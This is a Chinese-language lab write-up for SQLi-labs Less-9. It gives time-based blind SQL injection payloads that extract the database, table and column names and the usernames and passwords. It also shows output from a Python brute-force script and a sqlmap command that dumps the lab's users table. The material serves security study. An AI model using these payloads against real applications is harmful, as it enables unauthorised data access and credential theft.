---
title: less9
url: https://www.yuque.com/u29002979/ep2zrx/mgmsa0t9su37pbv4
---

```bash
$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";
```

`?id=1`显示You are in...........
`id=1'`也显示You are in...........
&#x20;尝试了N种闭合方式之后发现页面的**回显都是一样的**并且**没有任何报错信息**，
通过源码找到字符型闭合 ’
浅试一下**时间盲注**\ <a name="V17MH"></a>

# 时间盲注

<a name="kObnI"></a>

## 猜解数据库名称

> **if(1,sleep(5),0)**
> if()函数中，
>
> - x为布尔盲注中的长度、字符猜测语句，如：length(database())=1
> - sleep()函数，a为时间间隔，如果前面的语句x为真，则在页面出来前间隔a秒；
> - 0：占位

`?id=-1' or if(ascii(mid(database(),1,1))<=135,sleep(5),0)--+` 延时五秒了 <a name="kSZVm"></a>

## 猜解数据表名称

`?id=-1' or if(mid((select group_concat(table_name) from information_schema.tables where table_schema=database(),1,1)='e'),sleep(5),0)--+` <a name="j47RV"></a>

## 猜解字段名称

`?id=-1' or if(mid((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'),1,1)='e',sleep(5),0)--+` <a name="aRdmK"></a>

## 猜解字段内容

`?id=-1' or if(mid((select group_concat(username,0x7e,password) from users),1,1)='D',sleep(5),0)--+`

<a name="REjRI"></a>

# 用python跑时间盲注

[time-blind.py](https://www.yuque.com/attachments/yuque/0/2022/py/29430497/1668822268338-e637faec-85f6-486f-aebb-01a572063c08.py?_lake_card=%7B%22src%22%3A%22https%3A%2F%2Fwww.yuque.com%2Fattachments%2Fyuque%2F0%2F2022%2Fpy%2F29430497%2F1668822268338-e637faec-85f6-486f-aebb-01a572063c08.py%22%2C%22name%22%3A%22time-blind.py%22%2C%22size%22%3A3708%2C%22type%22%3A%22text%2Fx-python%22%2C%22ext%22%3A%22py%22%2C%22source%22%3A%22%22%2C%22status%22%3A%22done%22%2C%22mode%22%3A%22title%22%2C%22download%22%3Atrue%2C%22taskId%22%3A%22uae8e72ad-3444-4889-b4c9-55bfc76ab54%22%2C%22taskType%22%3A%22upload%22%2C%22__spacing%22%3A%22both%22%2C%22id%22%3A%22u943232bd%22%2C%22margin%22%3A%7B%22top%22%3Atrue%2C%22bottom%22%3Atrue%7D%2C%22card%22%3A%22file%22%7D)

> url = "http://192.168.31.193/Less-10/?id=1'"

```bash
┌──(root㉿guoyx)-[/home/kali/sql-python]
└─# python3 time-blind.py  
数据库名为->s
数据库名为->se
数据库名为->sec
数据库名为->secu
数据库名为->secur
数据库名为->secur
数据库名为->secur
数据库名为->secury
第一个表为->e
第一个表为->em
第一个表为->ema
第一个表为->emai
第二个表为->r
第二个表为->re
第二个表为->ref
第二个表为->refr
第三个表为->u
```

<a name="FUnXU"></a>

# sqlmap

```bash
┌──(root㉿guoyx)-[~]
└─# sqlmap -u 192.168.31.193/Less-9/?id=1 --batch -D "security" -T "users" --dump

Database: security
Table: users
[13 entries]
+----+------------+----------+
| id | password   | username |
+----+------------+----------+
| 1  | Dumb       | Dumb     |
| 2  | I-kill-you | Angelina |
| 3  | p@ssword   | Dummy    |
| 4  | crappy     | secure   |
| 5  | stupidity  | stupid   |
| 6  | genious    | superman |
| 7  | mob!le     | batman   |
| 8  | admin      | admin    |
| 9  | admin1     | admin1   |
| 10 | admin2     | admin2   |
| 11 | admin3     | admin3   |
| 12 | dumbo      | dhakkan  |
| 14 | admin4     | admin4   |
+----+------------+----------+
```
